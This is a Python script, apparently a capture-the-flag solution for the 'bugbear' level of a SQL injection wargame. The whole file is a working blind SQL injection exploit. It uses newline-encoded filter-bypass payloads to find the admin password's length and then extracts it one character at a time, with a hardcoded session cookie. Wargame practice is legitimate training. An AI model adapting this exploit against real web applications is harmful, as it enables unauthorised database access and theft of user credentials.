import requests
import string

header = {"Cookie": "PHPSESSID=eir9opar1tmb15lmh931grquf3;"}
url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
string_data = string.digits + string.ascii_letters

print(string_data)

password = ""
password_len = 1

# find password length
while True:
    data = "?no=1%0a||%0aid%0ain%0a(\"admin\")%0a%26%26%0alength(pw)%0ain%0a({})%23".format(str(password_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(password_len))
    password_len += 1
print("[+] Get Password Length : " + str(password_len))

# find password
for idx in range(1, password_len + 1):
    for i in string_data:
        data = "?no=1%0a||%0aid%0ain%0a(\"admin\")%0a%26%26%0ahex(mid(pw,{},1))%0ain%0a(hex({}))%23".format(idx,ord(i))
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            password = password + i
            print("[*] Finding... : " + password)
            break
print("[+] Found Password : " + password)